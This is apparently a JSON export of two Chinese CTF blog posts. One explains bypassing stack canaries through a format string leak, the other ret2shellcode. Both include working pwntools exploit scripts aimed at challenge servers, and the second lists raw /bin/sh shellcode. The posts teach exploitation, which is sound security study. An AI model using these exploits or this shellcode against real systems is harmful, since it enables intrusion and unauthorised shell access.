[{"id":"6305599be3907855ef6ac9a4a58f6cab","title":"CANARY(bypass1): 格式化字符串漏洞","content":"CANARY (bypass1):  格式化字符串漏洞CANARY 保护机制简介及格式化字符漏洞利用方法\n​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t——by DuskyJuniXor\n\nCANARY 是什么\nCanary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。\ncanary 是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从 fs&#x2F;gs 寄存器中获取一个值，一般存到 EBP - 0x4(32位) 或 RBP - 0x8(64位) 的位置。当函数结束时会检查这个栈上的值是否和存进去的值一致，若一致则正常退出，如果是栈溢出或者其他原因导致 canary 的值发生变化，那么程序将执行 ___stack_chk_fail 函数，继而终止程序。\n\n\nCANARY 特点\ncanary 一般最高位是 \\x00，64 位程序的 canary 大小是 8 个字节，32 位的是 4 个字节，canary 的位置不一定就是与ebp 存储的位置相邻，具体得看程序的汇编操作\n\nCanary 值在 rbp 到 rsp 之间（并不一定是rbp-8的位置）\n\nCanary 值以 0x00 结尾,如果程序没有漏洞但栈上面刚好是一个满的字符串,这个 0x00 可以当做截断,避免被打印出来\n\nCanary 值如果被改写,程序会崩溃\n\n\n\n含有 CANARY 保护的栈分布\n\n\nCANARY 在 ida pro 中的体现\n\n\n\n\n\n格式化字符串漏洞先了解下什么是格式化字符串漏洞\nC 语言中有一个非常常用的用于向屏幕输出字符的函数：printf。\n\nprintf 的第1个参数是字符串，被称为格式化字符串。程序员可以在该字符串中使用 %d、%s、%c 等占位符，printf 将依据这些占位符和其他参数整合出一个完整的字符串并输出。\n\n补充：C 语言中的常见占位符\n%d &#x2F;&#x2F; 十进制 - 输出十进制整数\n\n%s &#x2F;&#x2F; 字符串 - 从内存中读取字符串\n\n%x &#x2F;&#x2F; 十六进制 - 输出十六进制数\n\n%c &#x2F;&#x2F; 字符 - 输出字符\n\n%p &#x2F;&#x2F; 指针 - 指针地址\n\n%n &#x2F;&#x2F; 到目前为止所写的字符数\n\n例如：\nint a &#x3D; 0;\nprintf(&quot;a &#x3D; %d&quot;, a);\n\n显然当你运行 c 代码时，会输出 “a &#x3D; 0” 那么，当此处有程序员不小心写成了这样：\nprintf(&quot;a &#x3D; %d&quot;);\n\n会怎么样呢？\n\n\n我们发现终端输出了一个意想不到的数字 11932576\n\n之所以会出现上面的现象，主要是因为 printf 不会检查格式化字符串中的占位符是否与所给的参数数目相等。而在 printf 输出的过程中，每遇到一个占位符，就会到“约定好”的位置获取数据并根据该占位符的类型解码并输出。\n\n也就是说，当我们在 printf() 函数中有 a 时，参数 %d 和 a 依次被 rdi、rsi 传入栈中，printf() 函数正常按照 %d 所规定的方式来输出 a。但当 printf() 函数中没有参数 a 时，printf() 函数并不知道这一点，它将仍输入它的第二个参数，尽管这个参数可能来源于其它地方。\n\n\n利用方法\n因为通过格式化字符串漏洞可以实现任意内存的读写，而且，在一个程序里，不同函数在运行中使用的canary值是相同的，所以可以利用格式化字符串漏洞泄露 canary 的值，并在栈溢出时用此 canary 覆盖 canary 的位置，从而绕过 canary 保护机制，使程序正常返回\n\n例题：canary\n首先 checksec 下，发现开启了 canary 保护、NX 保护\n\n\n文件拖入 ida pro 分析，发现明显的格式化字符串漏洞以及明显的可利用的 backdoor 函数\n\n\n查看栈区，分析 buf 大小和 canary 位置\n\n\n\n\n确定 canary 在 printf 函数的第几个参数以打印出 canary 的值\n\n方法一：计算法\nx64 下有 5 个参数是由寄存器传递的，其它参数由栈传递。由上图知 buf 栈大小为 0x40，除以 4 得共 16 个 qword 地址，再结合 canary  (即var_8) 的位置，可得出 canary 应该是在 printf() 的第 21 个参数的位置。\n\n方法二：gdb 调试法\n开启 gdb 调试或直接运行，输入AAAA%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x，查看 41414141 (AAAA ascii 码) 出现位置，是第16个，再加上 x64 下 5 个由寄存器传递的参数，可得 canary 在第 16 个参数\n\n\n\n编写 exp.py\nfrom pwn import *\ncontext(arch &#x3D; &#39;amd64&#39;, os &#x3D; &#39;linux&#39;, log_level &#x3D; &#39;debug&#39;)\n\nbackdoor_addr &#x3D; 0x401244\np &#x3D; remote(&quot;119.3.83.106&quot;, 10545)\np.recv()\np.sendline(b&#39;%21$p&#39;)\np.recvuntil(b&quot;hello, &quot;)\ncanary &#x3D; int(p.recvuntil(b&#39;00&#39;), 16)\nprint(f&#39;canary &#x3D; &#123;hex(canary)&#125;&#39;)\np.recvuntil(b&quot;comment:&quot;)\npayload &#x3D; b&#39;A&#39;*64 + b&#39;A&#39;*56 + p64(canary) + b&#39;A&#39;*8 + p64(backdoor_addr)\np.sendline(payload)\np.interactive()\n\n\n注：\n&quot;%k$x&quot; 表示访问第k个参数，并且把它以十六进制输出\n&quot;%k$d&quot; 表示访问第k个参数，并且把它以十进制输出\n\n\n成功 getshell!\n\n\n","slug":"CANARY-bypass1-格式化字符串漏洞","date":"2022-11-05T07:18:49.000Z","categories_index":"","tags_index":"pwn","author_index":"DuskyJuniXor"},{"id":"f810949b38b4506e3b08df56cbb68d1d","title":"ret2shellcode","content":"ret2Shellcode​\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t——by DuskyJuniXor\n\n原理\n在栈溢出的攻击技术中通常是要控制函数的返回地址到自己想要的地方执行自己想要执行的代码。ret2shellcode 代表返回到 shellcode 中即控制函数的返回地址到预先设定好的 shellcode 区域中去执行 shellcode 代码，这是非常危险的。\n\n什么是 shellcode？shellcode 是一段用于利用软件漏洞而执行的代码，shellcode 为 16 进制的机器码，因为经常让攻击者获得 shell 而得名。shellcode 常常使用机器语言编写。 可在暂存器 eip 溢出后，塞入一段可让 CPU 执行的 shellcode 机器码，让电脑可以执行攻击者的任意指令。\n利用思路\nret2shellcode 的关键在于我们找到一个可读可写可执行的缓冲区，接下来把我们的 shellcode 放到这个缓冲区，然后跳转到我们的 shellcode 处执行。\n\n\n利用条件\n文件未开启 NX 保护或者有 mprotect() 函数存在修改权限\n\n常用shellcodeshellcode &#x3D;\n&quot;\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05&quot;\n\nshellcode &#x3D; &quot;\\x31\\xc0\\x31\\xdb\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\x51\\x52\\x55\\x89\\xe5\\x0f\\x34\\x31\\xc0\\x31\\xdb\\xfe\\xc0\\x51\\x52\\x55\\x89\\xe5\\x0f\\x34&quot;\n\nshellcode &#x3D; &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&quot;\n\n使用 Pwntools 生成 shellcode用pwntool中的shellcraft.sh(),再转汇编字节码asm()\nasm(shellcraft.sh())\n\n例题pwn2_2\n\nchecksec 检查保护，CANARY、PIE、RWX 都没有开，开启了 NX 保护\n\n\n文件拖入 ida pro 分析\n\n\n\n首先发现 mprotect() 函数，修改了 phone_number 地址权限为7（相当于 rwx）\n\n注：mprotect() 函数原型：\n#include &lt;sys&#x2F;mman.h&gt;\nint mprotect(void *addr, size_t len, int prot);\n\nprot 的取值如下，可以将几个属性结合使用（值相加）：\n\nPROT_READ：可写，值为 1\nPROT_WRITE：可读， 值为 2\nPROT_EXEC：可执行，值为 4\nPROT_NONE：不允许访问，值为 0\n\n\n\n\n没有发现可利用的 backdoor，但发现 main() 中调用了 read() 函数将 STDIN 区的缓存读入 phone_number，再查看 phone_number 的地址在 .bss 段，由上步可知phone_number具有 RWX 权限，同时有容易溢出的栈 buf\n\n\n于是思路明确，只要第一次向 phone_number 中写入 shellcode，再溢出 buf 使 rip 指向 phone_number 的地址\n\n编写 exp.py\nfrom pwn import *\ncontext(os &#x3D; &#39;linux&#39;, arch &#x3D; &#39;amd64&#39;, log_level &#x3D; &#39;debug&#39;)\n\nio &#x3D; remote(&quot;gxh191.top&quot;, 25532)\n\nphone_number &#x3D; 0x4040A0\n\npayload1 &#x3D; asm(shellcraft.sh())\nio.sendafter(b&#39;number: &#39;, payload1)\n\npayload2 &#x3D; b&#39;a&#39;*24 + p64(phone_number)\nio.sendafter(b&#39;buf: &#39;, payload2)\n\nio.interactive()\n\n成功 getshell！\n\n\n\n\n","slug":"ret2shellcode","date":"2022-11-03T04:58:03.000Z","categories_index":"","tags_index":"pwn","author_index":"DuskyJuniXor"}]